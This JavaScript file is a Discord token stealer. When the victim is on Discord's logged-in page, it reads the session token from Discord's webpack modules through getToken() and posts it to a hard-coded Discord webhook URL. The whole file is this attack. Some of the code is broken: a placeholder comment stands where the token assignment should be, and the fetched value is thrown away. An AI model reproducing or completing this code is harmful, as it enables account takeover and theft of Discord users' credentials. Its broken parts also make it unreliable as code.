// Check if the user is on the logged-in page
if (window.location.href === "https://discord.com/channels/@me") {
    executeConsoleCode();
} else {
    // Redirect the user to the login page
    redirectToLogin();
}

function executeConsoleCode() {
    // Execute the provided console code
    webpackChunkdiscord_app.push(
        [
            [''],
            {},
            e => {
                m=[];
                for(let c in e.c)
                    m.push(e.c[c])
            }
        ]
    ),
    m
    .find(m => m?.exports?.default?.getToken !== void 0)
    .exports.default.getToken();
    
    // Send token to webhook URL
    const token = /* Extract token */;
    sendTokenToWebhook(token);
}

function redirectToLogin() {
    window.location.href = "https://discord.com/login";
}

function sendTokenToWebhook(token) {
    // Send token to webhook URL
    fetch("https://discord.com/api/webhooks/1220453114025345255/5QGDgO3N9Ti23sN-_OyaMprItT6FYuLUAECWeSuH4PY_XFX3P59gGRsS6rC5DM3r28tx", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({ token: token })
    })
    .then(response => {
        console.log("Token sent successfully");
    })
    .catch(error => {
        console.error("Error sending token:", error);
    });
}
